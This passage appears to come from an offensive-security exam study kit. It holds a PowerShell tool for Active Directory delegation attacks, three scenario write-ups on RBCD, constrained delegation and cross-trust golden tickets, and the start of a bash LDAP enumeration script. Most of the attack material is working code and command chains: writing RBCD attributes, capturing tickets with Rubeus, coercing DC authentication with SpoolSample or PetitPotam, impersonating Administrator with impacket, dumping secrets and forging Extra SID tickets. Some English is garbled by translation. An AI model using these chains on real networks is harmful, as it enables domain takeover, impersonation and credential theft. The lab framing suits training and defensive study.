        Write-Output "-> Not SYSTEM. Rubeus monitor usually requires SYSTEM; local administrator + high integrity"
        Write-Output "You can often run away, but the tickets you capture depend on your identity in the session."
    }
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
    if ($p.IsInRole('S-1-5-32-544')) { Write-Output "-> Belong to the local administrator group (elevate rights to SYSTEM and look at the M06 module)" }
}

# ---------------------------------------------------------------------------
# RBCD: Check/Write/Rollback
# ---------------------------------------------------------------------------
function Get-M12dRbcd {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $dn = Get-M12dComputerDn $ComputerName
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    $raw = $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Value
    Write-M12dHead "RBCD Current Status: $ComputerName"
    Write-Output ("  DN : " + $dn)
    if (-not $raw) {
        Write-Output "The attribute is empty: no subject has been authorized yet, it is a clean state that can be written."
        return $dn
    }
    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList @($raw, 0)
    Write-Output ("Number of DACL entries:" + $sd.DiscretionaryAcl.Count)
    foreach ($ace in $sd.DiscretionaryAcl) {
        $who = $ace.SecurityIdentifier.Value
        try { $who = $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch { }
        Write-Output ("Allow {0} to represent others in {1} manner" -f $who, $ace.AccessMask)
    }
    return $dn
}

function Set-M12dRbcd {
    param(
        [Parameter(Mandatory = $true)][string]$ComputerName,
        [Parameter(Mandatory = $true)][string]$FakeSam
    )
    $dn = Get-M12dComputerDn $ComputerName
    $pair = Get-M12dSid $FakeSam
    $sid = $pair[0]
    Write-M12dHead "Write to RBCD: $ComputerName <- $FakeSam ($sid)"

    $sddl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
    Write-Output ("  SDDL : " + $sddl)
    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList $sddl
    $buf = New-Object 'byte[]' $sd.BinaryLength
    $sd.GetBinaryForm($buf, 0)

    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    try {
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Add($buf)
        $de.CommitChanges()
        Write-Output "[+] Writing successful. Be sure to remember to use -Mode RBCD-Rollback after the task is completed."
    } catch {
        Write-Output ("[!] Write failed:" + $_.Exception.Message)
        Write-Output "Troubleshooting: ① Does the current identity have GenericWrite/GenericAll for $dn?"
        Write-Output "② What is written is the complete DN of the computer object, not the container (the DN above is printed)"
        Write-Output "③ If the attribute already has a value, clear it with -Mode RBCD-Rollback before writing it."
        return
    }

    Write-Output ""
    Write-Output "--- Follow-up commands on the attack aircraft (Kali) side, replace the placeholders and execute them ---"
    Write-Output "impacket-getTGT -dc-ip TARGET 'DOMAIN/$FakeSam:<fake machine password>'"
    Write-Output "  export KRB5CCNAME=$($FakeSam.TrimEnd('$')).ccache"
    Write-Output "  impacket-getST -spn 'cifs/TARGET.corp.local' -impersonate $script:ImpersonateUser \"
    Write-Output "-dc-ip TARGET 'DOMAIN/$FakeSam:<fake machine password>'"
    Write-Output "  export KRB5CCNAME=$($script:ImpersonateUser).ccache"
    Write-Output "  impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET.corp.local"
}

function Clear-M12dRbcd {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $dn = Get-M12dComputerDn $ComputerName
    Write-M12dHead "Rollback RBCD: $ComputerName"
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    try {
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
        $de.CommitChanges()
        Write-Output "[+] The attributes have been cleared and the target machine has returned to the untaken state (exam review points)."
    } catch {
        Write-Output ("[!] Rollback failed:" + $_.Exception.Message)
        Write-Output "Confirm that the current identity has write permission for the object; or use -Mode RBCD to check the status and handle it manually."
    }
}

# ---------------------------------------------------------------------------
# Constrained Delegation: Enumerations + S4U Command Templates
# ---------------------------------------------------------------------------
function Get-M12dConstrained {
    param([Parameter(Mandatory = $true)][string]$Account)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($script:Root)
    $s.Filter = "(sAMAccountName=$Account)"
    [void]$s.PropertiesToLoad.Add('msDS-AllowedToDelegateTo')
    [void]$s.PropertiesToLoad.Add('userAccountControl')
    [void]$s.PropertiesToLoad.Add('servicePrincipalName')
    [void]$s.PropertiesToLoad.Add('distinguishedName')
    $r = $s.FindOne()
    Write-M12dHead "Constrained delegation configuration: $Account"
    if (-not $r) { Write-Output "Account $Account not found"; return }
    $uacRaw = 0
    if ($r.Properties.Contains('userAccountControl')) { $uacRaw = [Convert]::ToInt32($r.Properties['userAccountControl'][0]) }
    $trans = ($uacRaw -band 0x100000) -ne 0
    Write-Output ("  DN                        : " + $r.Properties['distinguishedName'][0])
    Write-Output ("  SPN                       : " + (@($r.Properties['servicePrincipalName']) -join ' | '))
    Write-Output ("  TrustedToAuthForDelegation: " + $trans + "(True=supports protocol conversion, S4U2Self does not require the password of the simulated person)")
    $targets = @($r.Properties['msDS-AllowedToDelegateTo'])
    if ($targets.Count -eq 0) { Write-Output "msDS-AllowedToDelegateTo: (empty, not a constrained delegation account)"; return }
    Write-Output "SPNs to which you can delegate:"
    foreach ($t in $targets) { Write-Output ("    - " + $t) }
    Write-Output "Note: The delegation list only has these SPNs, tickets cannot be used on other machines/service classes."
}

function Show-M12dS4uCommands {
    param([string]$Account, [string]$TargetSpn)
    if (-not $TargetSpn) { $TargetSpn = 'cifs/TARGET.corp.local' }
    Write-M12dHead "S4U2Self + S4U2Proxy command template (replacement placeholder)"
    Write-Output "[A] There is protocol conversion (TrustedToAuthForDelegation, the most common) - no password of the person being imitated is required"
    Write-Output "Windows (Rubeus, will write the ticket directly into memory /ptt):"
    Write-Output ("    .\\Rubeus.exe s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser \")
    Write-Output ("        /msdsspn:$TargetSpn /ptt")
    Write-Output "    .\\Rubeus.exe s4u /user:$Account /rc4:NTHASH /impersonateuser:$script:ImpersonateUser \"
    Write-Output ("        /msdsspn:$TargetSpn /ptt")
    Write-Output "  Linux（impacket）："
    Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
    Write-Output ("        -dc-ip TARGET 'DOMAIN/$Account:PASS'")
    Write-Output ("    export KRB5CCNAME=$script:ImpersonateUser.ccache")
    Write-Output ("    impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET")
    Write-Output ""
    Write-Output "[B] No protocol conversion - must hold the simulated user's own credentials, and can only use S4U2Proxy"
    Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
    Write-Output ("        -hashes :NTHASH -dc-ip TARGET 'DOMAIN/$Account:PASS'")
    Write-Output "When DC forces AES, add /aes256:<AES key of the simulated user> to Rubeus;"
    Write-Output "The simulated person's NTHASH cannot be used with S4U2Self, only with S4U2Proxy."
    Write-Output ""
    Write-Output "[C] Verification method when there are only service classes such as http/ in the delegation list:"
    Write-Output "curl --negotiate -u : http://TARGET/ (SPN is http/TARGET)"
    Write-Output "evil-winrm -i TARGET -r DOMAIN (SPN is wsman/TARGET)"

    if ($Execute -and (Test-Path (Join-Path $script:ToolDir 'Rubeus.exe'))) {
        Write-Output ""
        Write-Output "(-Execute is given and there is Rubeus.exe under -ToolDir)"
        Write-Output "The script does not save the password: Please fill in PASS manually in the following line and then execute it (the script will not run it automatically)"
        Write-Output ("    & (Join-Path '$script:ToolDir' 'Rubeus.exe') s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser /msdsspn:$TargetSpn /ptt")
    }
}

# ---------------------------------------------------------------------------
# Unconstrained delegation: pre-exploitation checks + monitor/trigger commands
# ---------------------------------------------------------------------------
function Get-M12dUnconstrained {
    Write-M12dHead "Unconstrained delegation pre-exploitation check (scenario 50)"
    $me = $env:COMPUTERNAME
    $host1 = if ($TargetComputer) { $TargetComputer } else { $me }
    Write-Output "Check target host: $host1"

    # 1) Whether the host is configured with unconstrained delegation
    try {
        $dn = Get-M12dComputerDn $host1
        $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
        $uac = 0
        if ($de.Properties['userAccountControl'].Value) {
            $uac = [Convert]::ToInt32($de.Properties['userAccountControl'].Value)
        }
        if (($uac -band 0x80000) -ne 0) {
            Write-Output "[1/4] Unconstrained delegation: Yes (UAC contains 0x80000), this machine can be used as a landing point"
        } else {
            Write-Output "[1/4] Unconstrained delegation: No (UAC=$uac without 0x80000) - use m12-ad-enum-windows.ps1 instead"
            Write-Output "-Mode Delegation Find a host that is actually equipped with unconstrained delegation and come back"
        }
    } catch {
        Write-Output ("[1/4] Failed to read computer object:" + $_.Exception.Message)
    }

    # 2) Current identity (SYSTEM is required to capture tickets)
    Write-Output "[2/4] Identity self-check"
    Show-M12dIdentity

    # 3) Whether the print service pipeline is available (SpoolSample depends on it)
    Write-Output "[3/4] Induced vector reachability"
    $spoolPath = "\\$host1\pipe\spoolss"
    if (Test-Path $spoolPath) {
        Write-Output ("$spoolPath is accessible -> SpoolSample / printerbug is likely to be available")
    } else {
        Write-Output ("$spoolPath is inaccessible -> The printing service is closed or blocked by a patch, change to PetitPotam(EFSRPC)/DFSCoerce")
    }

    # 4) Are the tools in place?
    Write-Output "[4/4] Tool check (-ToolDir $script:ToolDir)"
    foreach ($t in @('Rubeus.exe', 'SpoolSample.exe', 'printerbug.exe', 'PetitPotam.exe')) {
        $p = Join-Path $script:ToolDir $t
        if (Test-Path $p) { Write-Output ("Already in place:" + $p) }
        else { Write-Output ("Missing:" + $t + "(It’s not necessary. If you don’t have it, use equivalent tools or just use monitor passively, etc.)") }
    }

    Write-Output ""
    Write-Output "--- Utilization steps (two windows; add -Execute and the script will start monitor directly when the tool is in place) ---"
    Write-Output "Window 1 (ticket capture): .\\Rubeus.exe monitor /interval:5 /nowrap"
    Write-Output "Window 2 (inducing DC authentication to this machine):"
    Write-Output (".\\SpoolSample.exe DC01 $host1 (or printerbug DC01 $host1)")
    Write-Output "Alternative induction: impacket-petitpotam -u USER@DOMAIN -p 'PASS' -dc-ip TARGET LHOST DC01.corp.local"
    Write-Output "After getting the base64 TGT of DC01\$, return to the attack plane:"
    Write-Output "         impacket-ticketConverter dc.txt dc.ccache"
    Write-Output "         export KRB5CCNAME=dc.ccache"
    Write-Output "         impacket-secretsdump -k -no-pass DC01.corp.local"
    Write-Output "Verification: The subject in klist should be DC01\$; if krbtgt can be dumped, it means it is a DC machine ticket."

    if ($Execute) {
        $rubeus = Join-Path $script:ToolDir 'Rubeus.exe'
        if (Test-Path $rubeus) {
            Write-Output ""
            Write-Output "[-Execute] Start Rubeus monitor (Ctrl-C to stop; stop when you get the ticket)..."
            & $rubeus monitor /interval:5 /nowrap
        } else {
            Write-Output "[-Execute] But $rubeus does not exist, it only prints the command without taking any action."
        }
    }
}

# ---------------------------------------------------------------------------
# Enum: See all three types of delegation at once
# ---------------------------------------------------------------------------
function Get-M12dEnumAll {
    $root = $script:Root
    Write-M12dHead "Unconstrained delegation host (scenario 50 landing point)"
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s.Filter = '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
    $s.PageSize = 200
    [void]$s.PropertiesToLoad.Add('sAMAccountName'); [void]$s.PropertiesToLoad.Add('dnsHostName')
    foreach ($r in $s.FindAll()) { Write-Output ("  " + $r.Properties['sAMAccountName'][0] + "  " + $r.Properties['dnsHostName'][0]) }

    Write-M12dHead "Constrained Delegated Accounts (Scenario 52)"
    $s2 = New-Object System.DirectoryServices.DirectorySearcher
    $s2.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s2.Filter = '(msDS-AllowedToDelegateTo=*)'
    $s2.PageSize = 200
    [void]$s2.PropertiesToLoad.Add('sAMAccountName'); [void]$s2.PropertiesToLoad.Add('msDS-AllowedToDelegateTo')
    foreach ($r in $s2.FindAll()) {
        Write-Output ("  " + $r.Properties['sAMAccountName'][0] + " -> " + (@($r.Properties['msDS-AllowedToDelegateTo']) -join ', '))
    }

    Write-M12dHead "Computer with RBCD configured (Scenario 51: Attribute is not empty = has been written)"
    $s3 = New-Object System.DirectoryServices.DirectorySearcher
    $s3.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s3.Filter = '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'
    $s3.PageSize = 200
    [void]$s3.PropertiesToLoad.Add('sAMAccountName'); [void]$s3.PropertiesToLoad.Add('distinguishedName')
    foreach ($r in $s3.FindAll()) {
        Write-Output ("  " + $r.Properties['sAMAccountName'][0])
        Write-Output ("      " + $r.Properties['distinguishedName'][0])
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
function Show-M12dHelp {
    Write-Output @"

m12-delegation-attacks.ps1 —— RBCD / constrained delegation / Unconstrained delegation

  -Mode Enum
      List the current status of the three types of delegation (without side effects）
  -Mode RBCD -TargetComputer TARGET -FakeAccount 'FAKE01$' [-ImpersonateUser Administrator]
      Write the fake machine account into the target machine msDS-AllowedToActOnBehalfOfOtherIdentity，
      And print the attack machine side getTGT/getST/wmiexec subsequent commands
  -Mode RBCD-Rollback -TargetComputer TARGET
      Clear this attribute (must be done for the exam, otherwise the target machine will be taken over)）
  -Mode Constrained -ServiceAccount svc_sql [-Spn 'cifs/TARGET.corp.local']
      Check the delegation target SPN and whether it supports protocol conversion and printing S4U two sets of commands（Rubeus + impacket）
  -Mode Unconstrained [-TargetComputer Local name] [-ToolDir C:\Tools] [-Execute]
      Four pre-checks + Rubeus monitor / induce authentication command；-Execute Start directly monitor

  Universal：-Domain DOMAIN（Required when no domain is added or cross-domain） -ImpersonateUser USER
        -Execute（By default, it only prints commands and does not actually call external exe）
placeholder：DOMAIN=corp.local  TARGET=WS02  USER/PASS/NTHASH Replaced by parameters or print template。
"@
}

# ---------------------------------------------------------------------------
# Main process
# ---------------------------------------------------------------------------
if ($Help) { Show-M12dHelp; return }

try { $script:Root = Initialize-M12dRoot }
catch {
    Write-Output "[!] Initialization failed: $($_.Exception.Message)"
    exit 1
}
Write-Output "[*] Search root: $script:Root"

switch ($Mode) {
    'Enum' {
        Get-M12dEnumAll
    }
    'RBCD' {
        if (-not $TargetComputer -or -not $FakeAccount) {
            Write-Output "[!] -Mode RBCD requires -TargetComputer TARGET and -FakeAccount 'FAKE01$'"
            Write-Output "Example: .\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'"
            Show-M12dHelp
            exit 1
        }
        Get-M12dRbcd $TargetComputer | Out-Null
        Set-M12dRbcd -ComputerName $TargetComputer -FakeSam $FakeAccount
    }
    'RBCD-Rollback' {
        if (-not $TargetComputer) {
            Write-Output "[!] -Mode RBCD-Rollback requires -TargetComputer TARGET"
            exit 1
        }
        Clear-M12dRbcd $TargetComputer
    }
    'Constrained' {
        if (-not $ServiceAccount) {
            Write-Output "[!] -Mode Constrained requires -ServiceAccount service account name (such as svc_sql)"
            Write-Output "Don’t know which account is equipped with constrained delegation? Run first -Mode Enum"
            exit 1
        }
        Get-M12dConstrained $ServiceAccount
        Show-M12dS4uCommands -Account $ServiceAccount -TargetSpn $Spn
    }
    'Unconstrained' {
        Get-M12dUnconstrained
    }
    'Help' { Show-M12dHelp }
}

Write-Output ""
Write-Output "[*] Tip: High-value actions related to tickets (secretsdump/ticketer) are all done on the attack machine."
Write-Output "[*] The Windows side is only responsible for ticket capture and induction authentication; remember to roll back RBCD and clean up the tickets after completion."
````

## Scenario 51: Have relevant write permissions on the computer object, but cannot directly manage the target host (RBCD)

**Situation**: Have write permissions for the computer object of the target machine (such as WS02) (typically: GenericWrite/GenericAll or can be changed to `msDS-AllowedToActOnBehalfOfOtherIdentity`); also have a "subject that can be simulated" (you can create a self-made machine account, the default domain policy allows ordinary users to add 10 units). Goal: Access WS02 as administrator.

**Assumptions**: The current user can add machine accounts to the domain (`MachineAccountQuota`>0, default 10); WS02's `msDS-AllowedToActOnBehalfOfOtherIdentity` is currently empty (has not been used); the target account (Administrator) is not Protected Users, and "Sensitive accounts cannot be delegated" is not checked.

**Prepare (attacker)**: impacket `addcomputer / getTGT / getST / wmiexec`; **Windows profiler** writing attribute function, see `m12-delegation-attacks.ps1 -Mode RBCD` (use .NET ADSI to write security descriptors, does not rely on the Active Directory module).

**Procedure**：
```bash
# ① Add a fake machine (note the password)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake#Passw0rd' \
  -dc-ip DC01.corp.local 'CORP/USER:PASS'
# ② Windows side: Write the SID of FAKE01$ into AllowedToActOnBehalfOfOtherIdentity of WS02
#    See m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
# ③ Attack machine: Ask for TGT for the fake machine, then simulate Administrator and ask for cifs/WS02 service ticket
impacket-getTGT -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
export KRB5CCNAME=FAKE01.ccache
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
```
**Scripts used**: `m12-delegation-attacks.ps1` (RBCD mode: check SID, write attributes, rollback).

**Validation**: `wmiexec -k` successfully exited the shell; `klist` can see the TGS of `cifs/WS02.corp.local` and the main body is `Administrator`.

**Failure branches and alternatives**：
- `addcomputer` Report quota/Permission error（MAQ=0）→ use you**Existing service accounts that already control passwords or hashes**（bring SPN）When pretending to be the principal, the rest of the process remains the same (it must be the account you hold the credentials for)）。
- Property write failed → Make sure you write WS02 computer object integrity DN（not a container); use `m12-delegation-attacks.ps1` The rollback function clears the attributes and tries again.；GenericWrite If it does not mean that the property can be changed, check whether there is a looser setting on the target object. ACL（Change to a machine where you do have write permissions）。
- `getST` newspaper KDC wrong → S4U2Self successful but S4U2Proxy Rejected, common reason: the target account is sensitive and cannot be delegated / false subject none SPN（addcomputer Will automatically register `host/FAKE01`，If you create an account manually, you need to make up for it SPN）/ The ticket has expired, please try again ①。
- simulation Administrator rejected → Instead, impersonate another administrator (such as another member of the Domain Admin group)）。

**Exam / OPSEC notes**: Change the delegation attribute of WS02 to **persistent traces**. After completing the task, you must roll back (the script provides rollback), otherwise points will be deducted when the target machine is taken over during review; the fake machine account can be deleted after it is used up (optional, but at least delete the ticket cache that is no longer used).

---

## Scenario 52: The service account is controlled, constrained delegation exists, but only specified services can be accessed

**Situation**: Master a service account (such as `svc_sql`) configured with **Constrained Delegation (AllowedToDelegateTo)**. It can simulate any user but **can only** access the SPN specified by the delegation (such as `cifs/WS02` / `http/WS02`), and cannot access any machine.

**Assumptions**: The service account credentials are valid; the delegation target SPN and host are known (see `m12-ad-enum-windows.ps1 -Mode Delegation` for enumeration); distinguish two sub-scenarios - ① `TrustedToAuthForDelegation` (protocol conversion, S4U2Self does not require the impersonator password); ② No protocol conversion → must hold the TGT/password of the impersonated user ("Constrained delegation + known user credentials" scenario, rely on `getST` `-hashes`/`-aesKey` Bring directly).

**Prepare (attacker)**: `impacket-getST`; Windows side `Rubeus s4u` template is in `m12-delegation-attacks.ps1 -Mode Constrained`.

**Procedure**：
```bash
# Protocol conversion (most common): take TGT of svc_sql → S4U2Self(Administrator) → S4U2Proxy(cifs/WS02)
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
# Alternative: No protocol conversion → use the impersonated user’s own hash
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -hashes :NTHASH -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
```
Windows side equivalence：`Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/WS02 /ptt`（protocol conversion); given when there is no conversion Rubeus add `/aes256`（The impersonated user hash is not available for S4U2Self，Can only go S4U2Proxy）。

**Scripts used**: `m12-delegation-attacks.ps1` (Constrained Delegation Two Subcase Template + Target SPN Enumeration).

**Validation**: After getting `Administrator.ccache`, `wmiexec -k` enter WS02; when only HTTP SPN is allowed, change to `curl --negotiate`/WinRM corresponding tool verification instead of SMB.

**Failure branches and alternatives**：
- The delegation target is `cifs/WS02` But you want to use other services on the same host (such as `http`）→ If the delegation list is written as `cifs/WS02` Single item, service type cannot be changed; check `AllowedToDelegateTo` Does it contain `http`/`wsman`，use `-altservice` Only if the hosts are the same and the configuration allows multiple service classes。
- simulated Administrator Not accessible (Sensitive cannot be delegated）→ Change to an administrator account that can be simulated。
- only NTHASH No clear text password → `getST` bring `-hashes`；DC force AES-only time required `-aesKey`（Take from enumeration）。
- The service account itself SPN need（S4U The premise is that the person being imitated is a service account identity）——svc Accounts generally come with their own SPN，If you don’t make up one first。

**Exam / OPSEC notes**: Constrained delegation is only valid for **specified SPN hosts**. Do not waste time trying to use tickets on other machines; simulate objects and target services are minimized according to scenarios, and clear the ccache immediately after getting the target to avoid tickets remaining on the attack machine.

---

## Scenario 53: Mastering the high authority of the subdomain, the ultimate goal is Lingen

**Situation**: The subdomain (`child.corp.local`) has been controlled with high permissions (including subdomain krbtgt or subdomain DA can be dumped), and the final target asset is at the forest root (`corp.local`). **It cannot be preset to be feasible**: It must first be determined whether the trust type/direction and SID filtering are effective.

**Assumptions**: Need to master - ① Trust type: Intra-forest father-son trust (`TrustAttributes: WITHIN_FOREST`, SID filtering is not effective by default → Extra SID attack is possible); or external/inter-forest trust (SID filtering is enabled by default → Extra SID is invalid); ② Direction: two-way / one-way (it can be authenticated); ③ Sub-domain krbtgt hash (required for Extra SID golden ticket) or sub-domain trust key.

**Prepare (attacker)**: `nltest`/PowerShell enumeration trust (script `m12-ad-enum-linux.sh -Mode Trust`); `impacket-ticketer` (do Extra SID golden ticket); confirm root domain SID (`Get-DomainSID`/ldapsearch).

**Procedure**：
```bash
# ① Determination: Check the trust attributes and SIDs of both parties on the subdomain
nltest /domain_trusts /all_trusts
ldapsearch ... "(trustedDomain)" trustAttributes trustDirection     # 0x20=WITHIN_FOREST, 2=Two-way
# ② Use the subdomain krbtgt as a golden ticket and insert it into the root domain Enterprise Admins SID
impacket-ticketer -nthash <child krbtgt NT> -domain child.corp.local \
  -domain-sid <child domain SID> \
  -extra-sid 'S-1-5-21-<ROOT-DOMAIN-SID>-519' Administrator
export KRB5CCNAME=Administrator.ccache
# ③ Authentication to root domain assets (cifs or LDAP of root DC)
impacket-secretsdump -k -no-pass ROOTDC.corp.local
```
**Scripts used**: `m12-ad-enum-linux.sh` (Trust/Domain SID enumeration output); `m12-laps-and-trust-notes.md` (Decision table + Extra SID condition quick check).

**Validation**: `secretsdump -k` can dump the root domain `krbtgt` to the root DC, which proves that the Extra SID is effective (the root domain identity is obtained). If only the subdomain content is obtained/rejected, it means that the filtering is effective or the direction does not match, and the failure branch is taken.

**Failure branches and alternatives**：
- trust is external/forest（SID Filter on）→ Extra SID Invalid, don’t waste it: use cross-domain instead ACL（subdomain DA Often granted certain resource permissions to the root domain, first enumerate the root domain's rights to subdomain subjects. ACL）Or find other entrances reachable in the root domain（LAPS/delegate/Certificate re-evaluation）。
- One-way trust direction is"root→child"（Subdomain cannot be authenticated to root）→ Extra SID Neither the mutual trust ticket nor the mutual trust ticket can be used, so we can only rely on other paths within the root zone.。
- no subdomain krbtgt But already controlled subdomain DA → first in subdomain DC `secretsdump` take krbtgt Make another golden ticket; you can’t get it krbtgt（Only control the wrong DC High authority）→ Move other horizontal directions within the sub-domain to DC。
- The golden ticket subject failed to authenticate in the root zone.（TGS rejected）→ examine `/etc/hosts` Reagan DC FQDN、`-extra-sid` root domain SID Whether it is written correctly (less 519 suffix or root domain SID Copying errors are high-frequency errors）。

**Exam / OPSEC notes**: The golden ticket belongs to the "most sensitive operation in the domain" and is only executed after confirming the trust determination (WITHIN_FOREST + direction is feasible); the ticketer only runs locally on the attack machine and does not deliver any files to the target; clean up the ccache after completion.

---

#### `m12-ad-enum-linux.sh` {#m12-ad-enum-linux-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# Purpose: A collection of command templates for enumerating AD/LDAP from the Linux (Kali) side - ldapsearch basics/user/
#       computers/groups/spn/delegation/LAPS/trust/SID, plus nmap ldap script, netexec, bloodhound-
#       python three auxiliary lines. Each mode prints the command to be executed before (by default) actually executing it.
# Scenario: M12 Scenario 49 (read LAPS), 51 (RBCD prefix: find writable computer objects), 52 (find delegation and SPN),
#       53 (trust decision + domain SID). Used with m12-laps-and-trust-notes.md.
# Dependencies: ldap-utils (ldapsearch, Kali: sudo apt install -y ldap-utils);
#       nmap (base/nmap mode); netexec (netexec mode); bloodhound-python (bloodhound
#       mode); impacket-lookupsid / python3 (sid mode, choose one of the two);
#       The script does not exit silently when the tool is missing, prints a readable error and degrades to "print command only".
# Use: ./m12-ad-enum-linux.sh -m all -s DC01.corp.local -D corp.local \
#            -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m laps  -s DC01.corp.local -D corp.local -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m trust -s DC01.corp.local -D corp.local -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m base -s DC01.corp.local -n # Only print commands but do not execute them
# Placeholder (variables must be used in scripts, replaced before running, do not write real domain name/IP/password):
#   TARGET = DC/target host IP or FQDN (-s passed in, for example DC01.corp.local)
#   DOMAIN = AD domain name FQDN (-D is passed in, for example corp.local; NetBIOS section uses -N, for example CORP)
#   USER/PASS/NTHASH = bind credentials (-u/-p/-H); NTHASH only with netexec
#       Bloodhound mode is available (LDAP simple binding requires clear text, NTHASH mode will automatically prompt and downgrade)
# Test status: Not tested in a real domain environment; local bash -n passed, the logic is "print + execution + downgrade prompt"
# Differences from docs/12-ad-attacks.md:
#   1) The document is written as `-Mode Trust` (PowerShell style), but Bash actually uses `-m trust`, which has the same meaning.
#   2) The nltest in the document 53 scenario is a Windows command. The trust mode of this script uses ldapsearch.
#      (objectClass=trustedDomain) equivalent implementation; the original text of nltest is retained in m12-laps-and-
#      trust-notes.md, will not be executed in this script.
#   3) The document does not require the five modes of base/nmap/netexec/bloodhound/sid. They are completed here to facilitate one
#      The command ran through the cold start enumeration of "unknown domain".
# =============================================================================
set -u

MODE="all"
DC=""            # -s  TARGET：DC Host（IP or FQDN）
DOMAIN=""        # -D  DOMAIN：domain FQDN
NETBIOS=""       # -N  NetBIOS Name (for binding, leave blank to start from DOMAIN Derivation：corp.local -> CORP）
USER=""          # -u
PASS=""          # -p
NTHASH=""        # -H
BASEDN=""        # -b  Override default BaseDN
OUTDIR="$HOME/osep/loot/m12"
DRY=0            # -n  Only prints the command, does not execute it
PYBIN="$(command -v python3 || true)"

usage() {
    sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

parameter：
  -m <mode>   enumeration mode (default all）：
              all         Run in turn base/users/computers/groups/spn/delegation/laps/trust
              base        RootDSE naming context + nmap ldap script + Anonymous readability detection
              users       domain user（sAMAccountName/UPN/description/pwdLastSet）
              computers   domain computer（dnsHostName/operatingSystem/last login）
              groups      domain group + privileged group member（DA/EA/Schema Admins/Builtin Admins）
              spn         servicePrincipalName=*（Kerberoast candidate）
              delegation  Unconstrained(UAC 524288)/constraint(msDS-AllowedToDelegateTo)/
                          RBCD(msDS-AllowedToActOnBehalfOfOtherIdentity) Search all three categories at once
              laps        LAPS Four attribute detection（legacy ms-Mcs-AdmPwd* + Windows LAPS
                          msLAPS-Password* / msLAPS-EncryptedPassword）
              trust       trustedDomain：trustPartner/trustAttributes/trustDirection
                          + Decision table（WITHIN_FOREST=0x20 / Two-way=3）
              sid         domain SID（impacket-lookupsid priority, otherwise python3 untie objectSid）
              nmap        nmap -n -sV --script "ldap* and not brute"
              netexec     netexec ldap / smb / winrm Three quick password spray detection
              bloodhound  bloodhound-python -c ALL（output zip Return to local machine BloodHound analyze）
  -s <host>   DC / target host（TARGET），Required
  -D <fqdn>   domain FQDN（DOMAIN），Required (for derivation BaseDN with binding DN）
  -N <name>   NetBIOS Domain name (default from -D Capitalize the first paragraph）
  -u <user>   Bind user（USER）；Leave blank to bind anonymously
  -p <pass>   clear text password（PASS）；Give -u Required when
  -H <hash>   NT hash（NTHASH），only netexec / bloodhound Mode support
  -b <dn>     Manually specified BaseDN（default DC=corp,DC=local The form consists of -D Derivation）
  -o <dir>    Product directory (default ~/osep/loot/m12）
  -n          Only print command is not executed（dry run，write report/Used when taking exam notes）
  -h          This help

exit code：0 normal / 1 Parameter error / 2 Dependencies are missing and cannot be downgraded
EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }

have() { command -v "$1" >/dev/null 2>&1; }

while getopts "m:s:D:N:u:p:H:b:o:nh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        D) DOMAIN="$OPTARG" ;;
        N) NETBIOS="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        b) BASEDN="$OPTARG" ;;
        o) OUTDIR="$OPTARG" ;;
        n) DRY=1 ;;
        h) usage ;;
        *) usage ;;
